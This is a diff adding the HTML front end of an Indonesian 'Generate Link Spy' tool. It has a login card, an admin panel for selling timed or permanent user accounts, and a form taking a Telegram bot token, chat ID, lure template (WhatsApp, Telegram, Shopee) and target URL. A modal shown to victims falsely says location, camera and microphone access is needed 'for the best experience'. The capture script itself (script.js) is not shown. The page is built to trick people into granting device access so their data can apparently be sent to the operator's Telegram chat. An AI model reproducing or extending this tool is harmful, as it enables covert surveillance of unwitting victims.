@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Admin Dashboard & Generate</title>
+<style>
+  /* Style tetap sama seperti sebelumnya */
+  *{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Roboto,Arial}
+  body{
+    margin:0;
+    padding:20px;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    min-height:100vh;
+    background:linear-gradient(135deg,#141e30,#243b55);
+    color:#fff;
+  }
+  .card{
+    background:rgba(255,255,255,0.07);
+    border-radius:18px;
+    padding:28px;
+    width:100%;
+    max-width:420px;
+    box-shadow:0 8px 25px rgba(0,0,0,.3);
+    backdrop-filter:blur(10px);
+    animation:fadeIn .6s ease-out;
+  }
+  @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+  h1{
+    font-size:22px;
+    text-align:center;
+    margin-bottom:24px;
+    color:#0ff;
+  }
+  label{
+    font-size:14px;
+    color:#ddd;
+    margin-bottom:6px;
+    display:block;
+  }
+  input[type=text],input[type=password],input[type=url], select{
+    width:100%;
+    padding:12px;
+    border:1px solid rgba(255,255,255,.2);
+    background:rgba(255,255,255,.05);
+    border-radius:8px;
+    font-size:15px;
+    color:#fff;
+    margin-bottom:14px;
+    outline:none;
+    transition:.25s;
+  }
+  input:focus, select:focus{border-color:#0ff;box-shadow:0 0 6px #0ff3}
+  button{
+    width:100%;
+    padding:14px;
+    background:linear-gradient(135deg,#00c6ff,#0072ff);
+    color:#fff;
+    border:none;
+    border-radius:10px;
+    font-size:16px;
+    font-weight:600;
+    margin-top:10px;
+    cursor:pointer;
+    transition:.25s;
+  }
+  button:hover{transform:translateY(-2px);box-shadow:0 6px 16px rgba(0,0,0,.4)}
+  #linkOut{
+    font-size:14px;
+    word-break:break-all;
+    margin-top:20px;
+    padding:16px;
+    border-radius:12px;
+    background:rgba(0,0,0,.35);
+    border:1px solid rgba(255,255,255,.1);
+    display:none;
+    animation:fadeIn .6s ease-out;
+  }
+  #linkOut strong{color:#0ff}
+  #linkOut a{color:#6f0;text-decoration:none}
+  #linkOut a:hover{text-decoration:underline}
+  .admin-panel {
+    display: flex;
+    flex-direction: column;
+    gap: 20px;
+    padding-top: 20px;
+  }
+  .user-list {
+    background: rgba(255, 255, 255, 0.05);
+    border-radius: 12px;
+    padding: 15px;
+  }
+  .user-item {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 8px 0;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+  }
+  .user-item:last-child {
+    border-bottom: none;
+  }
+  .user-item span {
+    font-weight: 500;
+  }
+  .user-item button {
+    width: auto;
+    padding: 6px 12px;
+    background: #ff4d4d;
+    font-size: 14px;
+    margin: 0;
+  }
+  .add-user-form input, .add-user-form button, .add-user-form select {
+    margin-bottom: 8px;
+  }
+  .logout-btn {
+    background: #ff4d4d;
+    margin-top: 20px;
+  }
+  .custom-modal-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.7);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 1000;
+  }
+  .custom-modal {
+    background: #fff;
+    border-radius: 12px;
+    padding: 25px;
+    width: 90%;
+    max-width: 350px;
+    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.4);
+    color: #333;
+    text-align: center;
+    animation: modalSlideIn .3s ease-out;
+  }
+  @keyframes modalSlideIn {
+    from { opacity: 0; transform: translateY(-20px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  .custom-modal h2 {
+    font-size: 18px;
+    margin-top: 0;
+    color: #141e30;
+  }
+  .custom-modal p {
+    font-size: 14px;
+    line-height: 1.5;
+    margin-bottom: 15px;
+    color: #555;
+  }
+  .custom-modal .url-info {
+    font-size: 13px;
+    color: #0072ff;
+    word-break: break-all;
+    background: #e0f2ff;
+    padding: 8px;
+    border-radius: 6px;
+    margin-bottom: 15px;
+  }
+  .custom-modal .permission-text {
+    font-size: 14px;
+    margin-bottom: 20px;
+    color: #333;
+  }
+  .custom-modal button {
+    background: #0072ff;
+    color: #fff;
+    border: none;
+    padding: 10px 20px;
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 15px;
+    font-weight: 600;
+    transition: background-color 0.25s;
+    width: auto;
+  }
+  .custom-modal button:hover {
+    background: #0056b3;
+    transform: none;
+    box-shadow: none;
+  }
+  .user-status {
+    font-size: 12px;
+    color: #888;
+  }
+  .user-role {
+    font-size: 12px;
+    font-weight: bold;
+    color: #00c6ff;
+  }
+  .expired {
+    color: #ff4d4d;
+    font-weight: bold;
+  }
+  .form-group {
+    margin-bottom: 12px;
+  }
+</style>
+</head>
+<body>
+<div class="card" id="loginCard">
+  <h1>🔐 Login</h1>
+  <label>Username</label>
+  <input type="text" id="username" placeholder="Username">
+  <label>Password</label>
+  <input type="password" id="password" placeholder="Password">
+  <button onclick="login()">Masuk</button>
+</div>
+
+<div class="card" id="formCard" style="display:none">
+  <h1>🔗 Generate Link Spy</h1>
+  <label>Bot Token</label>
+  <input type="text" id="botToken" placeholder="">
+  <label>Chat ID</label>
+  <input type="text" id="chatId" placeholder="">
+  <label>Template Link</label>
+  <select id="templateSelect">
+    <option value="">Pilih Template</option>
+    <option value="wa">Grup WhatsApp</option>
+    <option value="tg">Grup/Channel Telegram</option>
+    <option value="sp">Shopee</option>
+  </select>
+  <label>URL Target</label>
+  <input type="url" id="targetUrl" placeholder="URL" required>
+  <button onclick="generate()">🚀 Generate Link</button>
+  <div id="linkOut"></div>
+  <button class="logout-btn" onclick="logout()">Keluar</button>
+</div>
+
+<div class="card" id="adminCard" style="display:none">
+  <h1>⚙️ Admin Dashboard</h1>
+  <div class="admin-panel">
+    <h2>User List</h2>
+    <div class="user-list" id="userList"></div>
+    <h2>Add New User</h2>
+    <div class="add-user-form">
+      <div class="form-group">
+        <label>Username</label>
+        <input type="text" id="newUsername" placeholder="Username Baru">
+      </div>
+      <div class="form-group">
+        <label>Password</label>
+        <input type="password" id="newPassword" placeholder="Password Baru">
+      </div>
+      <div class="form-group">
+        <label>Role</label>
+        <select id="newRole">
+          <option value="user">User</option>
+          <option value="admin">Admin</option>
+        </select>
+      </div>
+      <div class="form-group">
+        <label>Tipe Akun</label>
+        <select id="accountType" onchange="toggleDurationInput()">
+          <option value="permanent">Permanen</option>
+          <option value="timed">Waktu</option>
+        </select>
+      </div>
+      <div class="form-group" id="durationGroup" style="display:none;">
+        <label>Durasi (Hari)</label>
+        <input type="number" id="durationDays" value="30" min="1">
+      </div>
+      <button onclick="addUser()">Tambah User</button>
+    </div>
+  </div>
+  <button class="logout-btn" onclick="logout()">Keluar</button>
+</div>
+
+<div class="custom-modal-overlay" id="customPermissionModal" style="display:none;">
+  <div class="custom-modal">
+    <h2>Pemberitahuan</h2>
+    <p>Anda akan diarahkan ke:</p>
+    <div class="url-info" id="modalTargetUrl"></div>
+    <p class="permission-text">Izin akses lokasi, kamera, dan mikrofon diperlukan untuk pengalaman terbaik.</p>
+    <button onclick="acceptPermissions()">OK</button>
+  </div>
+</div>
+
+<script src="script.js"></script>
+
+</body>
+  </html>
+
+    
